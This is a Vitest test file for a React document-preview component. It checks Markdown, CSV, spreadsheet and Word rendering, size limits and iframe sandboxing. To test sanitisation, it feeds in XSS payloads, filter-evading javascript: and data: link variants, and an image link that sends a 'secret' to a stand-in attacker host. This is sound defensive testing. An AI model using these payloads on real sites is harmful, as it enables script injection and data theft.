// @vitest-environment jsdom

import { afterEach, describe, expect, it, vi } from "vitest"
import {
  cleanup,
  fireEvent,
  render,
  screen,
  waitFor,
} from "@testing-library/react"
import {
  DocumentPreview,
  MAX_PREVIEW_BYTES,
  previewKind,
} from "./document-preview"

const renderAsync = vi.hoisted(() => vi.fn())
vi.mock("docx-preview", () => ({ renderAsync }))

afterEach(() => {
  cleanup()
  renderAsync.mockReset()
  vi.restoreAllMocks()
  vi.unstubAllGlobals()
  document.body.replaceChildren()
})

function serve(text: string) {
  vi.stubGlobal(
    "fetch",
    vi.fn(async () => new Response(text))
  )
}

describe("simple document previews", () => {
  it("routes major modern formats to local renderers", () => {
    expect(previewKind("deck.pptx", "application/octet-stream")).toBe("pptx")
    expect(previewKind("report.docx", "application/octet-stream")).toBe("docx")
    expect(previewKind("budget.xlsx", "application/octet-stream")).toBe("xlsx")
    expect(previewKind("paper.pdf", "application/pdf")).toBe("pdf")
    expect(previewKind("old.ppt", "application/octet-stream")).toBe(
      "unsupported"
    )
  })

  it("renders Markdown as readable content without a document iframe", async () => {
    serve("# Plan\n\n**Ready** for review")
    const view = render(
      <DocumentPreview
        url="/plan.md"
        name="plan.md"
        contentType="text/markdown"
      />
    )
    expect(await screen.findByRole("heading", { name: "Plan" })).toBeTruthy()
    expect(screen.getByText("Ready").tagName).toBe("STRONG")
    expect(view.container.querySelector("iframe")).toBeNull()
  })

  it("shows CSV as escaped cells", async () => {
    serve("Name,Amount\nA,<script>alert(1)</script>")
    const view = render(
      <DocumentPreview url="/data.csv" name="data.csv" contentType="text/csv" />
    )
    expect(await screen.findByText("<script>alert(1)</script>")).toBeTruthy()
    expect(view.container.querySelector("script")).toBeNull()
  })

  it("renders spreadsheet cells with their sheet name", async () => {
    const Excel = (await import("exceljs")).default
    const workbook = new Excel.Workbook()
    const sheet = workbook.addWorksheet("Budget")
    sheet.addRow(["Item", "Cost"])
    sheet.addRow(["Design", 42])
    const bytes = await workbook.xlsx.writeBuffer()
    vi.stubGlobal(
      "fetch",
      vi.fn(async () => new Response(new Uint8Array(bytes)))
    )
    render(
      <DocumentPreview
        url="/budget.xlsx"
        name="budget.xlsx"
        contentType="application/octet-stream"
      />
    )
    expect(await screen.findByText("Design")).toBeTruthy()
    expect(screen.getByText("42")).toBeTruthy()
  })
})

describe("a Markdown file", () => {
  it("shows an image as a link, so a file an agent wrote cannot fetch from any server", async () => {
    serve(
      "![tracker](https://evil.example/pixel.png?d=secret)\n\n[docs](https://example.com/docs) and [bad](javascript:alert(1))"
    )
    const view = render(
      <DocumentPreview
        url="/plan.md"
        name="plan.md"
        contentType="text/markdown"
      />
    )
    const image = await screen.findByRole("link", { name: "tracker" })
    expect(view.container.querySelector("img")).toBeNull()
    expect(image.getAttribute("href")).toBe(
      "https://evil.example/pixel.png?d=secret"
    )
    // The same links chat has: a new tab that is told nothing about the app.
    const docs = screen.getByRole("link", { name: "docs" })
    expect(docs.getAttribute("target")).toBe("_blank")
    expect(docs.getAttribute("rel")).toBe("noopener noreferrer")
    // A link with an unsafe protocol loses its address.
    const bad = screen.getByText("bad").closest("a")
    expect(bad?.getAttribute("href") ?? "").not.toContain("javascript")
  })

  it("does not run HTML in it", async () => {
    serve("Hello <img src=x onerror=alert(1)> <script>alert(2)</script>")
    const view = render(
      <DocumentPreview
        url="/plan.md"
        name="plan.md"
        contentType="text/markdown"
      />
    )
    await screen.findByText(/Hello/)
    expect(view.container.querySelector("img, script")).toBeNull()
  })
})

describe("a file too large to preview", () => {
  const tooLarge = /over 25 MB.*too large to preview.*download/i

  it("says so from its declared size, without reading it", async () => {
    const response = new Response("tiny", {
      headers: { "content-length": String(MAX_PREVIEW_BYTES + 1) },
    })
    const cancel = vi.spyOn(response.body!, "cancel")
    vi.stubGlobal(
      "fetch",
      vi.fn(async () => response)
    )
    render(
      <DocumentPreview url="/big.txt" name="big.txt" contentType="text/plain" />
    )
    expect((await screen.findByRole("alert")).textContent).toMatch(tooLarge)
    expect(cancel).toHaveBeenCalled()
  })

  it("is stopped at the cap when the size is not declared, not read to the end", async () => {
    const chunk = new Uint8Array(1024 * 1024)
    let pulled = 0
    const body = new ReadableStream<Uint8Array>({
      pull(controller) {
        pulled += 1
        if (pulled > 60) controller.close()
        else controller.enqueue(chunk)
      },
    })
    vi.stubGlobal(
      "fetch",
      vi.fn(async () => new Response(body))
    )
    render(
      <DocumentPreview url="/big.txt" name="big.txt" contentType="text/plain" />
    )
    expect((await screen.findByRole("alert")).textContent).toMatch(tooLarge)
    // The 25 MB the cap allows and a few chunks the stream had queued, not
    // the 60 it holds.
    expect(pulled).toBeGreaterThan(25)
    expect(pulled).toBeLessThan(40)
  })

  it("previews a file exactly at the cap", async () => {
    vi.stubGlobal(
      "fetch",
      vi.fn(
        async () =>
          new Response("all of it", {
            headers: { "content-length": String(MAX_PREVIEW_BYTES) },
          })
      )
    )
    render(
      <DocumentPreview
        url="/edge.txt"
        name="edge.txt"
        contentType="text/plain"
      />
    )
    expect(await screen.findByText("all of it")).toBeTruthy()
    expect(screen.queryByRole("alert")).toBeNull()
  })
})

describe("a Word document", () => {
  const links = [
    '<a href="javascript:alert(1)">script link</a>',
    '<a href="  JAVASCRIPT:alert(2)">spaced script</a>',
    '<a href="java\nscript:alert(3)">split script</a>',
    '<a href="data:text/html,<b>x</b>">data link</a>',
    '<a href="/relative/path">relative link</a>',
    '<a href="https://example.com/page">web link</a>',
    '<a href="  http://example.com/spaced  ">spaced web link</a>',
    '<a href="mailto:ada@example.com">mail link</a>',
    '<a href="#top">anchor</a>',
  ].join(" ")

  // As docx-preview does: nodes made by the page's own document, put into the
  // container it is given.
  function draw(html: string, styles: string) {
    renderAsync.mockImplementation(
      async (_bytes: ArrayBuffer, container: HTMLElement) => {
        const style = document.createElement("style")
        style.textContent = styles
        const wrapper = document.createElement("div")
        wrapper.className = "docx-wrapper"
        wrapper.innerHTML = html
        container.appendChild(style)
        container.appendChild(wrapper)
      }
    )
  }

  function frameDocument(frame: HTMLIFrameElement): Document {
    if (!frame.contentDocument) throw new Error("the frame has no document")
    return frame.contentDocument
  }

  async function openReport() {
    vi.stubGlobal(
      "fetch",
      vi.fn(async () => new Response(new Uint8Array([80, 75, 3, 4])))
    )
    render(
      <DocumentPreview
        url="/report.docx"
        name="report.docx"
        contentType="application/octet-stream"
      />
    )
    const frame = await screen.findByTitle("report.docx")
    if (!(frame instanceof HTMLIFrameElement)) throw new Error("not a frame")
    await waitFor(() =>
      expect(frameDocument(frame).querySelector(".docx-wrapper")).not.toBeNull()
    )
    return frame
  }

  it("is drawn in a sandboxed frame that can run and open nothing", async () => {
    draw(links, "")
    const frame = await openReport()
    // No allow-scripts, allow-popups or allow-top-navigation: only what the
    // app needs to draw into the frame.
    expect(frame.getAttribute("sandbox")).toBe("allow-same-origin")
    expect(frame.getAttribute("srcdoc")).toContain("Content-Security-Policy")
    expect(frame.getAttribute("srcdoc")).toContain("default-src 'none'")
    await waitFor(() => expect(frame.dataset.ready).toBe("true"))
  })

  it("keeps its styles and everything else it holds out of the app", async () => {
    draw(links, "button { display: none } body { background: red }")
    const appButton = document.createElement("button")
    appButton.textContent = "An app button"
    document.body.appendChild(appButton)
    const frame = await openReport()

    const inside = frameDocument(frame)
    expect(inside.querySelector("style")?.textContent).toContain(
      "background: red"
    )
    expect(document.querySelector(".docx-wrapper")).toBeNull()
    expect(
      Array.from(document.querySelectorAll("style")).some((style) =>
        style.textContent.includes("background: red")
      )
    ).toBe(false)
    expect(getComputedStyle(appButton).display).not.toBe("none")
    expect(document.querySelector("a")).toBeNull()
  })

  it("keeps only the links that lead to a web page, an address or a place in it", async () => {
    draw(links, "")
    const frame = await openReport()
    const hrefs = Object.fromEntries(
      Array.from(frameDocument(frame).querySelectorAll("a")).map((link) => [
        link.textContent,
        link.getAttribute("href"),
      ])
    )
    expect(hrefs).toEqual({
      "script link": null,
      "spaced script": null,
      "split script": null,
      "data link": null,
      "relative link": null,
      "web link": "https://example.com/page",
      "spaced web link": "http://example.com/spaced",
      "mail link": "mailto:ada@example.com",
      anchor: "#top",
    })
    for (const link of frameDocument(frame).querySelectorAll("a[href]")) {
      expect(link.getAttribute("rel")).toBe("noopener noreferrer")
      expect(link.hasAttribute("target")).toBe(false)
    }
  })

  it("opens a link in a tab of its own, from the app, and never in the frame", async () => {
    draw(links, "")
    const frame = await openReport()
    const inside = frameDocument(frame)
    const open = vi.spyOn(window, "open").mockReturnValue(null)

    const web = inside.querySelector('a[href^="https://example.com/page"]')
    if (!web) throw new Error("no web link")
    // Prevented: the frame is not left to navigate itself away.
    expect(fireEvent.click(web)).toBe(false)
    expect(open).toHaveBeenCalledWith(
      "https://example.com/page",
      "_blank",
      "noopener,noreferrer"
    )

    open.mockClear()
    const anchor = inside.querySelector('a[href="#top"]')
    if (!anchor) throw new Error("no anchor")
    // A place in the document stays in the document.
    expect(fireEvent.click(anchor)).toBe(true)
    expect(open).not.toHaveBeenCalled()

    // Something that is not a link opens nothing.
    expect(fireEvent.click(inside.body)).toBe(true)
    expect(open).not.toHaveBeenCalled()

    // Nor is an address that got past the checks by another way opened from
    // the app, where a javascript: address would run as the app.
    const late = inside.createElement("a")
    late.setAttribute("href", "javascript:alert(1)")
    inside.body.appendChild(late)
    expect(fireEvent.click(late)).toBe(false)
    expect(open).not.toHaveBeenCalled()
  })

  it("says so when it cannot be drawn", async () => {
    renderAsync.mockRejectedValue(new Error("corrupt"))
    vi.stubGlobal(
      "fetch",
      vi.fn(async () => new Response(new Uint8Array([1, 2, 3])))
    )
    render(
      <DocumentPreview
        url="/broken.docx"
        name="broken.docx"
        contentType="application/octet-stream"
      />
    )
    expect((await screen.findByRole("alert")).textContent).toBe(
      "Could not render this document."
    )
  })
})
